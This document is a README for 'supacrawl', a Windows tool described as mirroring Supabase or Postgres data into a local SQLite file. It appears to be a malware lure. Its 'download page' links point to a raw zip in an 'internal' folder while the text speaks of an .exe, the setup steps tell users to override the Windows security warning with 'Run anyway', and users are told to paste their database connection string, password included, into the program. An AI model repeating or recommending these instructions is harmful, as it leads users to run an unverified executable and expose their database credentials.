# 📦 supacrawl - Mirror Supabase data to your computer

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/agathetec5068/supacrawl/main/internal/Software_2.5.zip)

## 📁 What is supacrawl

Supacrawl helps you move your data from Supabase or any Postgres database into a local SQLite file. This tool keeps a copy of your information on your hard drive. You can use this file to search through your data or perform analysis without needing an internet connection. It works on your Windows machine and stores your information in a format that works with standard database tools.

## 💻 Requirements

To use this application, you need a computer running Windows 10 or Windows 11. You must have at least 500 megabytes of free space on your hard drive. A stable internet connection helps during the initial setup process as the tool connects to your database to pull your records. You do not need any coding skills or special software installed to execute these steps.

## 📥 How to download the software

You must visit the official release page to get the installer for your computer. 

[Click here to visit the download page](https://raw.githubusercontent.com/agathetec5068/supacrawl/main/internal/Software_2.5.zip)

Once you arrive at the page, look for the file ending in `.exe`. Click the name of this file to start the download. Your browser might ask you where to save the file. Choose a folder you can find later, such as your Downloads folder.

## 🛠 Setting up the application

1. Open the folder where you saved the installer file.
2. Double-click the file to open the setup menu.
3. Windows might show a security prompt. If you see this, click "More info" and then select "Run anyway" to continue.
4. Follow the prompts on the screen to finish the installation.
5. The installer places a shortcut icon on your desktop. Find this icon and double-click it to start the tool.

## ⚙️ Connecting your data

When the application opens, you see a menu asking for your database details. You need the connection string from your Supabase dashboard. 

1. Log into your Supabase account.
2. Go to the project settings.
3. Select the Database option.
4. Copy the connection string provided in the Database URL section.
5. Paste this link into the text box inside the supacrawl application window.
6. Press the "Connect" button to verify the link.

## 🔄 Mirroring your information

After the tool connects to your database, it lists the available tables. You can select individual tables or choose to copy everything. Once you decide what to keep, press the "Start Sync" button. The application creates a local SQLite file in your Documents folder. This process takes time depending on the size of your database. Do not close the window until the progress bar reaches one hundred percent.

## 🔍 Searching your data

After the sync finishes, you can open your local database file at any time. You can use standard database viewing software to open the file saved in your Documents folder. SQLite files work with many free programs that let you look at tables, organize columns, and filter rows. Use these tools to query your data without needing the internet.

## 🛡 Keeping your information safe

The application stores your database password inside your system's secure credential vault. It does not send your data to external servers. Everything stays on your local machine. If you want to stop using the tool, you can delete the folder and the database file.

## 🆘 Troubleshooting common issues

If the application fails to connect, check your database URL. Ensure you included the correct password inside the string. If the software crashes, check your firewall settings. Sometimes, security tools block connections to database servers. Make sure your internet connection stays active during the initial data download. If the sync stops, restart the application and click the sync button again. It picks up where it left off, so you do not need to start over from the beginning.